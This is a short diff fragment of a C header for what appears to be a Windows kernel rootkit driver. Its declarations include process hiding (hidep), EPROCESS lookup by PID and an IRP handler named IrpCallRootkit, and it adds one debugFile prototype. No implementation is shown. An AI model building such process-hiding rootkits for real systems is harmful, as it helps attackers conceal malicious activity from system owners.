@@ -19,5 +19,7 @@ VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
 PCHAR hidep(UINT32 pid);
 ULONG find_eproc_pid();
 
+void debugFile(WCHAR name[]);
+
 NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage);
 NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
